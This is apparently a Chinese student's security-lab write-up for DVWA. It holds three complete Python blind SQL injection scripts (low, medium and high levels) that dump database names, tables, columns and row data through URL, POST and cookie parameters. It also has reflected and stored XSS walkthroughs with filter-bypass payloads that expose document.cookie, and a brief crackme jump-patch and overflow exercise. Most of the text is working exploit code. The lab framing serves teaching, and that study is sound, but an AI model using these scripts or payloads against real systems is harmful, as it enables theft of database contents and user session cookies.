
### low:

```python
import requests
import string

class Injection:
    def __init__(self,url):
        self.url = url
        self.s = requests.session()
        self.zifuji = [44,48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 95, 45, 64, 33, 38, 36]
        self.headers = {
            'Cookie': 'security=low; PHPSESSID=ms11imgpftrmfcp27rmk9s006c'
        }
    def process(self,yourstr,num1,num2):
        print("[+] Please wait ... {0} [{1}]/[{2}]".format(yourstr,str(num1),str(num2)),end='\r')
    def check(self,text):
        if "User ID exists in the database." in text:
            return True
        elif "User ID is MISSING from the database." in text:
            return False
    def run(self):
        self.get_itsnum()
        self.get_database_length()
        self.get_database()
        self.get_table_num()
        self.table_length = []
        self.table_name = []
        self.get_table_length()
        self.get_table_name()
        table_name = input('[-] table_name: ')
        self.get_column_num(table_name)
        self.column_length = []
        self.column_name = []
        self.get_column_length(table_name)
        self.get_column_name(table_name)
        column_names = input('[-] column_name: ').split(',')
        self.word_num = 0
        self.get_word_num(table_name,column_names[0])
        self.word_name = []
        self.word_length = []
        for i in range(len(column_names)):
            print(column_names[i])
            self.get_word_length(table_name,column_names[i])
            self.get_word_name(table_name,column_names[i],i)
        
    def get_itsnum(self):
        self.itsnum = 0
        for i in range(1,50):
            self.process('get_itsnum',i,50)
            theurl = self.url + "1' order by {0}%23".format(str(i)) + "&Submit=Submit#"
            html = self.s.get(theurl,headers=self.headers).text
            if not self.check(html):
                self.itsnum = i - 1
                break
        if self.itsnum > 0:
            print('\n==>',self.itsnum)
        else:
            print("\ncan not get the itsnum")
    def get_database_length(self):
        self.database_length = 0
        for i in range(1,30):
            self.process('get_database_length',i,30)
            theurl = self.url + "1' and length(database())={0}%23".format(str(i)) + "&Submit=Submit#"
            html = self.s.get(theurl,headers=self.headers).text
            if self.check(html):
                self.database_length = i
                break
        if self.database_length > 0:
            print('\n==>',self.database_length)
        else:
            print("\ncan not get the database_length")
    def get_database(self):
        self.database = ''
        for i in range(1,self.database_length+1):
            for j in self.zifuji:
                self.process(str(i) + ' get_database',j,self.database_length+1)
                theurl = self.url + "1' and ascii(substring(database(),{0},1))={1}%23".format(str(i),str(j)) + "&Submit=Submit#"
                html = self.s.get(theurl,headers=self.headers).text
                if self.check(html):
                    self.database += chr(j)
                    break
            if len(self.database) != i:
                self.database += '666'
        if len(self.database) > 0:
            print('\n==>',self.database)
        else:
            print("\n can not get the database")
    def get_table_num(self):
        self.table_num = 0
        for i in range(1,30):
            self.process('get_table_num',i,30)
            theurl = self.url + "1' and (select count(table_name)a from information_schema.tables where table_schema=database() having a={0})%23".format(str(i)) + "&Submit=Submit#"
            html = self.s.get(theurl,headers=self.headers).text
            if self.check(html):
                self.table_num = i
                break
        if self.table_num > 0:
            print('\n==>',self.table_num)
        else:
            print("\ncan not get the table_num")           
    def get_table_length(self):
        for i in range(1,50):
            self.process('get_table_length',i,50)
            theurl = self.url + "1' and (select length(group_concat(table_name)) as a from information_schema.tables where table_schema=database() having a={0})%23".format(str(i)) + "&Submit=Submit#"
            html = self.s.get(theurl,headers=self.headers).text
            if self.check(html):
                self.table_length.append(i)
                break
        if self.table_length[0] > 0:
            print('\n==>',self.table_length)
        else:
            print('\ncan not get the table_length')
    def get_table_name(self):
        name = ''
        for i in range(1,self.table_length[0]+1):
            for j in self.zifuji:
                self.process('{0} get_table_name'.format(i),j,50)
                theurl = self.url + "1' and (select ascii(substring(group_concat(table_name),{0},1)) as a from information_schema.tables where table_schema=database() having a={1})%23".format(str(i),str(j)) + "&Submit=Submit#"
                html = self.s.get(theurl,headers=self.headers).text
                if self.check(html):
                    name += chr(j)
                    break
            if len(name) != i:
                name += '|'
        if len(name) > 0:
            print('\n==>',name)
            self.table_name.append(name)
        else:
            print('\ncan not get the table_name')
    def get_column_num(self,table_name):
        self.column_num = 0
        for i in range(1,30):
            self.process('get_column_num',i,30)
            theurl = self.url + "1' and (select count(column_name) as a from information_schema.columns where table_schema=database() and table_name='{0}' having a={1})%23".format(table_name,str(i)) + "&Submit=Submit#"
            html = self.s.get(theurl,headers=self.headers).text
            if self.check(html):
                self.column_num = i
                break
        if self.column_num > 0:
            print('\n==>',self.column_num)
    def get_column_length(self,table_name):
        for i in range(1,100):
            self.process('get_column_length',i,100)
            theurl = self.url + "1' and (select length(group_concat(column_name)) as a from information_schema.columns where table_schema=database() and table_name='{0}' having a={1})%23".format(table_name,str(i)) + "&Submit=Submit#"
            html = self.s.get(theurl,headers=self.headers).text
            if self.check(html):
                self.column_length.append(i)
                break
        if len(self.column_length) >= 1:
            print('\n==>',self.column_length)
        else:
            print('\ncan not get the column_length')
    def get_column_name(self,table_name):
        name = ''
        for i in range(1,self.column_length[0]+1):
            for j in self.zifuji:
                self.process('{0} get_column_name'.format(str(i)),j,100)
                theurl = self.url + "1' and (select ascii(substring(group_concat(column_name),{0},1)) as a from information_schema.columns where table_schema=database() and table_name='{1}' having a={2})%23".format(str(i),table_name,str(j)) + "&Submit=Submit#"
                html = self.s.get(theurl,headers=self.headers).text
                if self.check(html):
                    name += chr(j)
                    break
            if len(name) != i:
                name += '|'
        if len(name) == self.column_length[0]:
            self.column_name.append(name)
            print('\n==>',self.column_name[0])
        else:
            print('\ncan not get the column_name')
    def get_word_num(self,table_name,column_name):
        for i in range(1,100):
            self.process('get_word_num',i,30)
            theurl = self.url + "1' and (select count({0}) as a from {1} having a={2})%23".format(column_name,table_name,str(i)) + "&Submit=Submit#"
            html = self.s.get(theurl,headers=self.headers).text
            if self.check(html):
                self.word_num = i
                break
        if self.word_num > 0:
            print('\n==>',self.word_num)
        else:
            print('\ncan not get the word_num')
    def get_word_length(self,table_name,column_name):
        for i in range(1,200):
            self.process('get_{0}_length'.format(column_name),i,200)
            theurl = self.url + "1' and (select length(group_concat({0})) as a from {1} having a={2})%23".format(column_name,table_name,str(i)) + "&Submit=Submit#"
            html = self.s.get(theurl,headers=self.headers).text
            if self.check(html):
                self.word_length.append(i)
                break
        if len(self.word_length) >= 1:
            print('\n==>',self.word_length)
        else:
            print('\ncan not get the word length') 
    def get_word_name(self,table_name,column_name,word_num):
        name = ''
        for i in range(1,self.word_length[word_num]+1):
            for j in self.zifuji:
                self.process('get_{0}_name'.format(str(i)),j,100)
                theurl = self.url + "1' and (select ascii(substring(group_concat({0}),{1},1)) as a from {2} having a={3})%23".format(column_name,str(i),table_name,str(j)) + "&Submit=Submit#"
                html = self.s.get(theurl,headers=self.headers).text
                if self.check(html):
                    name += chr(j)
                    break
            if len(name) != i:
                name += '|'
        self.word_name.append(name)
        print('\n==>',self.word_name[word_num])
```

### medium

```python
import requests
import string

class Injection:
    def __init__(self,url):
        self.url = url
        self.s = requests.session()
        self.zifuji = [44,48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 95, 45, 64, 33, 38, 36]
        self.headers = {
            'Cookie': 'security=medium; PHPSESSID=ms11imgpftrmfcp27rmk9s006c'
        }
    def process(self,yourstr,num1,num2):
        print("[+] Please wait ... {0} [{1}]/[{2}]".format(yourstr,str(num1),str(num2)),end='\r')
    def check(self,text):
        if "User ID exists in the database." in text:
            return True
        elif "User ID is MISSING from the database." in text:
            return False
    def tranhex(self,str1):
        result = '0x'
        for i in str1:
            result += hex(ord(i))[2:]
        return result
    def run(self):
        self.get_itsnum()
        self.get_database_length()
        self.get_database()
        self.get_table_num()
        self.table_length = []
        self.table_name = []
        self.get_table_length()
        self.get_table_name()
        table_name = input('[-] table_name: ')
        self.get_column_num(table_name)
        self.column_length = []
        self.column_name = []
        self.get_column_length(table_name)
        self.get_column_name(table_name)
        column_names = input('[-] column_name: ').split(',')
        self.word_num = 0
        self.get_word_num(table_name,column_names[0])
        self.word_name = []
        self.word_length = []
        for i in range(len(column_names)):
            print(column_names[i])
            self.get_word_length(table_name,column_names[i])
            self.get_word_name(table_name,column_names[i],i)
        
    def get_itsnum(self):
        self.itsnum = 0
        for i in range(1,50):
            self.process('get_itsnum',i,50)
            data = {
                'id':"1 order by {0}".format(str(i)),
                'Submit':'Submit',
            }
            html = self.s.post(self.url,data=data,headers=self.headers).text
            if not self.check(html):
                self.itsnum = i - 1
                break
        if self.itsnum > 0:
            print('\n==>',self.itsnum)
        else:
            print("\ncan not get the itsnum")
    def get_database_length(self):
        self.database_length = 0
        for i in range(1,30):
            self.process('get_database_length',i,30)
            data = {
                'id':"1 and length(database())={0}".format(str(i)),
                'Submit':'Submit',
            }
            html = self.s.post(self.url,data=data,headers=self.headers).text
            if self.check(html):
                self.database_length = i
                break
        if self.database_length > 0:
            print('\n==>',self.database_length)
        else:
            print("\ncan not get the database_length")
    def get_database(self):
        self.database = ''
        for i in range(1,self.database_length+1):
            for j in self.zifuji:
                self.process(str(i) + ' get_database',j,self.database_length+1)
                data = {
                    'id':"1 and ascii(substring(database(),{0},1))={1}".format(str(i),str(j)),
                    'Submit':'Submit',
                }
                html = self.s.post(self.url,data=data,headers=self.headers).text
                if self.check(html):
                    self.database += chr(j)
                    break
            if len(self.database) != i:
                self.database += '666'
        if len(self.database) > 0:
            print('\n==>',self.database)
        else:
            print("\n can not get the database")
    def get_table_num(self):
        self.table_num = 0
        for i in range(1,30):
            self.process('get_table_num',i,30)
            data = {
                'id':"1 and (select count(table_name)a from information_schema.tables where table_schema=database() having a={0})".format(str(i)),
                'Submit':'Submit',
            }
            html = self.s.post(self.url,data=data,headers=self.headers).text
            if self.check(html):
                self.table_num = i
                break
        if self.table_num > 0:
            print('\n==>',self.table_num)
        else:
            print("\ncan not get the table_num")           
    def get_table_length(self):
        for i in range(1,50):
            self.process('get_table_length',i,50)
            data = {
                'id':"1 and (select length(group_concat(table_name)) as a from information_schema.tables where table_schema=database() having a={0})".format(str(i)),
                'Submit':'Submit',
            }
            html = self.s.post(self.url,data=data,headers=self.headers).text
            if self.check(html):
                self.table_length.append(i)
                break
        if self.table_length[0] > 0:
            print('\n==>',self.table_length)
        else:
            print('\ncan not get the table_length')
    def get_table_name(self):
        name = ''
        for i in range(1,self.table_length[0]+1):
            for j in self.zifuji:
                self.process('{0} get_table_name'.format(i),j,50)
                data = {
                    'id':"1 and (select ascii(substring(group_concat(table_name),{0},1)) as a from information_schema.tables where table_schema=database() having a={1})".format(str(i),str(j)),
                    'Submit':'Submit',
                }
                html = self.s.post(self.url,data=data,headers=self.headers).text
                if self.check(html):
                    name += chr(j)
                    break
            if len(name) != i:
                name += '|'
        if len(name) > 0:
            print('\n==>',name)
            self.table_name.append(name)
        else:
            print('\ncan not get the table_name')
    def get_column_num(self,table_name):
        self.column_num = 0
        table_name = self.tranhex(table_name)
        print(table_name)
        for i in range(1,30):
            self.process('get_column_num',i,30)
            data = {
                'id':"1 and (select count(column_name) as a from information_schema.columns where table_schema=database() and table_name={0} having a={1})".format(table_name,str(i)),
                'Submit':'Submit',
            }
            html = self.s.post(self.url,data=data,headers=self.headers).text
            if self.check(html):
                self.column_num = i
                break
        if self.column_num > 0:
            print('\n==>',self.column_num)
    def get_column_length(self,table_name):
        table_name = self.tranhex(table_name)
        for i in range(1,100):
            self.process('get_column_length',i,100)
            data = {
                'id':"1 and (select length(group_concat(column_name)) as a from information_schema.columns where table_schema=database() and table_name={0} having a={1})".format(table_name,str(i)),
                'Submit':'Submit',
            }
            html = self.s.post(self.url,data=data,headers=self.headers).text
            if self.check(html):
                self.column_length.append(i)
                break
        if len(self.column_length) >= 1:
            print('\n==>',self.column_length)
        else:
            print('\ncan not get the column_length')
    def get_column_name(self,table_name):
        table_name = self.tranhex(table_name)
        name = ''
        for i in range(1,self.column_length[0]+1):
            for j in self.zifuji:
                self.process('{0} get_column_name'.format(str(i)),j,100)
                data = {
                    'id':"1 and (select ascii(substring(group_concat(column_name),{0},1)) as a from information_schema.columns where table_schema=database() and table_name={1} having a={2})".format(str(i),table_name,str(j)),
                    'Submit':'Submit',
                }
                html = self.s.post(self.url,data=data,headers=self.headers).text
                if self.check(html):
                    name += chr(j)
                    break
            if len(name) != i:
                name += '|'
        if len(name) == self.column_length[0]:
            self.column_name.append(name)
            print('\n==>',self.column_name[0])
        else:
            print('\ncan not get the column_name')
    def get_word_num(self,table_name,column_name):
        for i in range(1,100):
            self.process('get_word_num',i,30)
            data = {
                'id':"1 and (select count({0}) as a from {1} having a={2})".format(column_name,table_name,str(i)),
                'Submit':'Submit',
            }
            html = self.s.post(self.url,data=data,headers=self.headers).text
            if self.check(html):
                self.word_num = i
                break
        if self.word_num > 0:
            print('\n==>',self.word_num)
        else:
            print('\ncan not get the word_num')
    def get_word_length(self,table_name,column_name):
        for i in range(1,200):
            self.process('get_{0}_length'.format(column_name),i,200)
            data = {
                'id':"1 and (select length(group_concat({0})) as a from {1} having a={2})".format(column_name,table_name,str(i)),
                'Submit':'Submit',
            }
            html = self.s.post(self.url,data=data,headers=self.headers).text
            if self.check(html):
                self.word_length.append(i)
                break
        if len(self.word_length) >= 1:
            print('\n==>',self.word_length)
        else:
            print('\ncan not get the word length') 
    def get_word_name(self,table_name,column_name,word_num):
        name = ''
        for i in range(1,self.word_length[word_num]+1):
            for j in self.zifuji:
                self.process('get_{0}_name'.format(str(i)),j,100)
                data = {
                    'id':"1 and (select ascii(substring(group_concat({0}),{1},1)) as a from {2} having a={3})".format(column_name,str(i),table_name,str(j)),
                    'Submit':'Submit',
                }
                html = self.s.post(self.url,data=data,headers=self.headers).text
                if self.check(html):
                    name += chr(j)
                    break
            if len(name) != i:
                name += '|'
        self.word_name.append(name)
        print('\n==>',self.word_name[word_num])
```

### high

```python
import requests
import string

class Injection:
    def __init__(self,url):
        self.url = url
        self.s = requests.session()
        self.zifuji = [44,48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 95, 45, 64, 33, 38, 36]
    def get_headers(self,payload):
        headers = {
            'Cookie': "id={0}; security=high; PHPSESSID=ms11imgpftrmfcp27rmk9s006c".format(payload)
        }
        return headers
    def process(self,yourstr,num1,num2):
        print("[+] Please wait ... {0} [{1}]/[{2}]".format(yourstr,str(num1),str(num2)),end='\r')
    def check(self,text):
        if "User ID exists in the database." in text:
            return True
        elif "User ID is MISSING from the database." in text:
            return False
    def run(self):
        self.get_itsnum()
        self.get_database_length()
        self.get_database()
        self.get_table_num()
        self.table_length = []
        self.table_name = []
        self.get_table_length()
        self.get_table_name()
        table_name = input('[-] table_name: ')
        self.get_column_num(table_name)
        self.column_length = []
        self.column_name = []
        self.get_column_length(table_name)
        self.get_column_name(table_name)
        column_names = input('[-] column_name: ').split(',')
        self.word_num = 0
        self.get_word_num(table_name,column_names[0])
        self.word_name = []
        self.word_length = []
        for i in range(len(column_names)):
            print(column_names[i])
            self.get_word_length(table_name,column_names[i])
            self.get_word_name(table_name,column_names[i],i)
        
    def get_itsnum(self):
        self.itsnum = 0
        for i in range(1,50):
            self.process('get_itsnum',i,50)
            payload = "1' order by {0}#".format(str(i))
            html = self.s.get(self.url,headers=self.get_headers(payload)).text
            if not self.check(html):
                self.itsnum = i - 1
                break
        if self.itsnum > 0:
            print('\n==>',self.itsnum)
        else:
            print("\ncan not get the itsnum")
    def get_database_length(self):
        self.database_length = 0
        for i in range(1,30):
            self.process('get_database_length',i,30)
            payload = "1' and length(database())={0}#".format(str(i))
            html = self.s.get(self.url,headers=self.get_headers(payload)).text
            if self.check(html):
                self.database_length = i
                break
        if self.database_length > 0:
            print('\n==>',self.database_length)
        else:
            print("\ncan not get the database_length")
    def get_database(self):
        self.database = ''
        for i in range(1,self.database_length+1):
            for j in self.zifuji:
                self.process(str(i) + ' get_database',j,self.database_length+1)
                payload = "1' and ascii(substring(database(),{0},1))={1}#".format(str(i),str(j))
                html = self.s.get(self.url,headers=self.get_headers(payload)).text
                if self.check(html):
                    self.database += chr(j)
                    break
            if len(self.database) != i:
                self.database += '666'
        if len(self.database) > 0:
            print('\n==>',self.database)
        else:
            print("\n can not get the database")
    def get_table_num(self):
        self.table_num = 0
        for i in range(1,30):
            self.process('get_table_num',i,30)
            payload = "1' and (select count(table_name)a from information_schema.tables where table_schema=database() having a={0})#".format(str(i))
            html = self.s.get(self.url,headers=self.get_headers(payload)).text
            if self.check(html):
                self.table_num = i
                break
        if self.table_num > 0:
            print('\n==>',self.table_num)
        else:
            print("\ncan not get the table_num")           
    def get_table_length(self):
        for i in range(1,50):
            self.process('get_table_length',i,50)
            payload = "1' and (select length(group_concat(table_name)) as a from information_schema.tables where table_schema=database() having a={0})#".format(str(i))
            html = self.s.get(self.url,headers=self.get_headers(payload)).text
            if self.check(html):
                self.table_length.append(i)
                break
        if self.table_length[0] > 0:
            print('\n==>',self.table_length)
        else:
            print('\ncan not get the table_length')
    def get_table_name(self):
        name = ''
        for i in range(1,self.table_length[0]+1):
            for j in self.zifuji:
                self.process('{0} get_table_name'.format(i),j,50)
                payload = "1' and (select ascii(substring(group_concat(table_name),{0},1)) as a from information_schema.tables where table_schema=database() having a={1})#".format(str(i),str(j))
                html = self.s.get(self.url,headers=self.get_headers(payload)).text
                if self.check(html):
                    name += chr(j)
                    break
            if len(name) != i:
                name += '|'
        if len(name) > 0:
            print('\n==>',name)
            self.table_name.append(name)
        else:
            print('\ncan not get the table_name')
    def get_column_num(self,table_name):
        self.column_num = 0
        for i in range(1,30):
            self.process('get_column_num',i,30)
            payload = "1' and (select count(column_name) as a from information_schema.columns where table_schema=database() and table_name='{0}' having a={1})#".format(table_name,str(i))
            html = self.s.get(self.url,headers=self.get_headers(payload)).text
            if self.check(html):
                self.column_num = i
                break
        if self.column_num > 0:
            print('\n==>',self.column_num)
    def get_column_length(self,table_name):
        for i in range(1,100):
            self.process('get_column_length',i,100)
            payload = "1' and (select length(group_concat(column_name)) as a from information_schema.columns where table_schema=database() and table_name='{0}' having a={1})#".format(table_name,str(i))
            html = self.s.get(self.url,headers=self.get_headers(payload)).text
            if self.check(html):
                self.column_length.append(i)
                break
        if len(self.column_length) >= 1:
            print('\n==>',self.column_length)
        else:
            print('\ncan not get the column_length')
    def get_column_name(self,table_name):
        name = ''
        for i in range(1,self.column_length[0]+1):
            for j in self.zifuji:
                self.process('{0} get_column_name'.format(str(i)),j,100)
                payload = "1' and (select ascii(substring(group_concat(column_name),{0},1)) as a from information_schema.columns where table_schema=database() and table_name='{1}' having a={2})#".format(str(i),table_name,str(j))
                html = self.s.get(self.url,headers=self.get_headers(payload)).text
                if self.check(html):
                    name += chr(j)
                    break
            if len(name) != i:
                name += '|'
        if len(name) == self.column_length[0]:
            self.column_name.append(name)
            print('\n==>',self.column_name[0])
        else:
            print('\ncan not get the column_name')
    def get_word_num(self,table_name,column_name):
        for i in range(1,100):
            self.process('get_word_num',i,30)
            payload = "1' and (select count({0}) as a from {1} having a={2})#".format(column_name,table_name,str(i))
            html = self.s.get(self.url,headers=self.get_headers(payload)).text
            if self.check(html):
                self.word_num = i
                break
        if self.word_num > 0:
            print('\n==>',self.word_num)
        else:
            print('\ncan not get the word_num')
    def get_word_length(self,table_name,column_name):
        for i in range(1,200):
            self.process('get_{0}_length'.format(column_name),i,200)
            payload = "1' and (select length(group_concat({0})) as a from {1} having a={2})#".format(column_name,table_name,str(i))
            html = self.s.get(self.url,headers=self.get_headers(payload)).text
            if self.check(html):
                self.word_length.append(i)
                break
        if len(self.word_length) >= 1:
            print('\n==>',self.word_length)
        else:
            print('\ncan not get the word length') 
    def get_word_name(self,table_name,column_name,word_num):
        name = ''
        for i in range(1,self.word_length[word_num]+1):
            for j in self.zifuji:
                self.process('get_{0}_name'.format(str(i)),j,100)
                payload = "1' and (select ascii(substring(group_concat({0}),{1},1)) as a from {2} having a={3})#".format(column_name,str(i),table_name,str(j))
                html = self.s.get(self.url,headers=self.get_headers(payload)).text
                if self.check(html):
                    name += chr(j)
                    break
            if len(name) != i:
                name += '|'
        self.word_name.append(name)
        print('\n==>',self.word_name[word_num])
```

# DVWA——Reflected XSS

## 级别：low

### Reflected XSS Source

```php
<?php

header ("X-XSS-Protection: 0");

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Feedback for end user
    echo '<pre>Hello ' . $_GET[ 'name' ] . '</pre>';
}

?>
```

### 分析

 可以看到，代码直接引用了name参数，并没有任何的过滤与检查，存在明显的XSS漏洞 。

 输入

```
<script>alert('xss')</script>
```

![MNT1gJ.png](https://s2.ax1x.com/2019/11/14/MNT1gJ.png)

查看源码可以发现代码被解释执行了

![MNTa4O.png](https://s2.ax1x.com/2019/11/14/MNTa4O.png)

### 获取cookie

输入

```
<script>alert(document.cookie)</script>
```

![MNTxxJ.png](https://s2.ax1x.com/2019/11/14/MNTxxJ.png)

## 级别：medium

### Reflected XSS Source

```php
<?php

header ("X-XSS-Protection: 0");

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Get input
    $name = str_replace( '<script>', '', $_GET[ 'name' ] );

    // Feedback for end user
    echo "<pre>Hello ${name}</pre>";
}

?>
```

### 分析

 Medium级别的代码相对于Low级别的代码使用`str_replace`函数将输入中的`<script>`删除 

### 方法

1.  使用双写绕过，输入 `<scr<script>ipt>alert(document.cookie)</script>` 
2.  使用大小写绕过，输入 ` <sCript>alert(document.cookie)</script> `
3.  输入其他标签，如`  <IMG src=1 onerror=alert(document.cookie)> `

结果：

![MNH1mR.png](https://s2.ax1x.com/2019/11/14/MNH1mR.png)

## 级别：high

### Reflected XSS Source

```php
<?php

header ("X-XSS-Protection: 0");

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Get input
    $name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] );

    // Feedback for end user
    echo "<pre>Hello ${name}</pre>";
}

?>
```

### 分析

 可以看到High级别的代码使用了  `preg_replace ` 函数执行一个正则表达式的搜索和替换,其中 ` /<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i ` 是正则表达式 ` (.*) ` 表示贪婪匹配，`  /i ` 表示不区分大小写所以在High级别的代码中，所有关于  ` <script>  ` 标签均被过滤删除了 

### 方法

`<script>` 标签不管用了，但是可以使用其他标签绕过 

输入

```
<IMG src=1 onerror=alert(document.cookie)>
```

![MNbeHI.png](https://s2.ax1x.com/2019/11/14/MNbeHI.png)

# DVWA——Stored XSS

## 级别：low

### Stored XSS Source

```php
<?php

if( isset( $_POST[ 'btnSign' ] ) ) {
    // Get input
    $message = trim( $_POST[ 'mtxMessage' ] );
    $name    = trim( $_POST[ 'txtName' ] );

    // Sanitize message input
    $message = stripslashes( $message );
    $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

    // Sanitize name input
    $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

    // Update database
    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    //mysql_close();
}

?>
```

### 分析

 `isset() ` 函数在php中用来检测变量是否设置，该函数返回的是布尔类型的值，即true/false 

 `trim() ` 函数作用为移除字符串两侧空白字符或其他预定义字符 

 `stripslashes() ` 函数用于删除字符串中的反斜杠 

 `mysqli_real_escape_string() ` 函数会对字符串中的特殊号`(\x00，\n，\r，\，'，"，\x1a) ` 进行转义 

 在代码中对message，name输入框内容  没有进行XSS方面的过滤和检查 

 且通过  `query ` 语句插入到数据库中。所以存在存储型XSS漏洞 

### 方法

由于name和message输入框均存在xss。但name输入框有字符限制，这里可以使用burpsuite抓包修改name输入框内容： 

```
<script>alert(document.cookie)</script>
```

![MUAK3Q.png](https://s2.ax1x.com/2019/11/14/MUAK3Q.png)

![MUAQjs.png](https://s2.ax1x.com/2019/11/14/MUAQjs.png)

![MUA1un.png](https://s2.ax1x.com/2019/11/14/MUA1un.png)

**由于提交的结果存储在数据库中，所以每次刷新页面，输入的恶意代码就会被执行一次 **

## 级别：medium

### Stored XSS Source

```php
<?php

if( isset( $_POST[ 'btnSign' ] ) ) {
    // Get input
    $message = trim( $_POST[ 'mtxMessage' ] );
    $name    = trim( $_POST[ 'txtName' ] );

    // Sanitize message input
    $message = strip_tags( addslashes( $message ) );
    $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    $message = htmlspecialchars( $message );

    // Sanitize name input
    $name = str_replace( '<script>', '', $name );
    $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

    // Update database
    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    //mysql_close();
}

?>
```

### 分析

 `strip_tags() ` 函数剥去字符串中的 HTML、XML 以及 PHP 的标签，但允许使用 `<b>` 标签。 

 `addslashes() ` 函数返回在预定义字符（单引号、双引号、反斜杠、NULL）之前添加反斜杠的字符串。 

 `htmlspecialchars() ` 函数把预定义的字符&、"、'、<、>转换为 HTML 实体，防止浏览器将其作为HTML元素 

 对message输入内容进行检测过滤，因此无法再通过message参数注入XSS代码
但是对于name参数，只是简单过滤了`<script>`字符串，仍然存在存储型的XSS。 

### 方法

 抓包修改name输入内容:

1.  使用双写绕过，输入  `<scr<script>ipt>alert(document.cookie)</script> `
2.  使用大小写绕过，输入`  <sCript>alert(document.cookie)</script> `
3.  输入其他标签，如  `<IMG src=1 onerror=alert(document.cookie)> `

![MUmpy4.png](https://s2.ax1x.com/2019/11/14/MUmpy4.png)

**由于low级别已经注入过，所以打开medium级别会直接弹出cookie**

## 级别：high

### Stored XSS Source

```php
<?php

if( isset( $_POST[ 'btnSign' ] ) ) {
    // Get input
    $message = trim( $_POST[ 'mtxMessage' ] );
    $name    = trim( $_POST[ 'txtName' ] );

    // Sanitize message input
    $message = strip_tags( addslashes( $message ) );
    $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    $message = htmlspecialchars( $message );

    // Sanitize name input
    $name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $name );
    $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

    // Update database
    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    //mysql_close();
}

?>
```

### 分析

和上面两个级别一样，抓包修改name内容即可，代码对name输入内容利用正则匹配删除所有关于`<script>`标签

### 方法

抓包修改name内容为

```
<IMG src=1 onerror=alert(document.cookie)>
```

# 作业三

## crackme:

打开IDA找到判断跳转语句位置

![MReyX4.png](https://s1.ax1x.com/2019/11/19/MReyX4.png)

修改跳转指令

![MReocD.png](https://s1.ax1x.com/2019/11/19/MReocD.png)

应用到程序

![MReOAI.png](https://s1.ax1x.com/2019/11/19/MReOAI.png)

运行结果：

正确密码显示错误，错误密码显示正确。

![MRmkEn.png](https://s1.ax1x.com/2019/11/19/MRmkEn.png)

## overflow(1):

首先输入7个q看一下栈情况

